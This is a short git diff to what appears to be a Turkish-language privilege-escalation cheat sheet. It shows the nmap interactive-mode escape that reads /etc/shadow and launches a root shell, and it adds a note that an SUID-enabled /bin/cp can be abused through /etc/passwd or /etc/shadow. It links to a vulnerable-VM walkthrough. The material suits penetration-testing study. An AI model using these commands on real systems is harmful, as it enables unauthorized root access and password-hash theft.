@@ -35,6 +35,12 @@ nmap --interactive
 > !whoami              # root
 > !cat /etc/shadow     # SUCCESS: prints out hashed passwords
 > !bash                # SUCCESS: launches root shell
-````
 bkz -> https://gist.github.com/dergachev/7916152
+````
 
+````
+-rwsr-xr-x 1 root root 124932 Jan 14  2015 /bin/cp
+cp komutu SUID biti etkin. Bu durumda /etc/passwd veya /etc/shadow dosyaları kullanılarak root olunabilir.
+ayrıntılı bilgi için;
+bkz -> http://yunusyildirim.blogspot.com.tr/2016/04/kevgir-vm-cozum-walkthrough.html
+````
